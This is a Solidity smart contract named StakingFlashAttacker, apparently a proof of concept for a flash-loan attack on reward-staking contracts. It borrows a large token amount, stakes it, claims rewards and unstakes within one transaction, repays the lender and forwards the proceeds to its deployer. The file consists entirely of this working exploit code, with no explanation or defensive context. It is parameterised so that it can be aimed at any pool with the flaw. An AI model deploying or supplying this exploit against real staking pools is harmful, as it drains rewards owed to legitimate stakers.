// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRewardStaking {
    function stake(uint256 amount) external;
    function claimReward() external;
    function unstake(uint256 amount) external;
}

interface IFlashLender {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount, bytes calldata data) external;
}

contract StakingFlashAttacker is IFlashBorrower {
    IRewardStaking public immutable staking;
    IFlashLender public immutable lender;
    IERC20 public immutable stakeToken;
    address public immutable owner;

    constructor(address _staking, address _lender, address _stakeToken) {
        staking = IRewardStaking(_staking);
        lender = IFlashLender(_lender);
        stakeToken = IERC20(_stakeToken);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount) external {
        lender.flashLoan(flashAmount, "");
        payable(owner).transfer(address(this).balance);
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        stakeToken.approve(address(staking), amount);
        staking.stake(amount);
        staking.claimReward();
        staking.unstake(amount);

        stakeToken.transfer(address(lender), amount);
    }

    receive() external payable {}
}
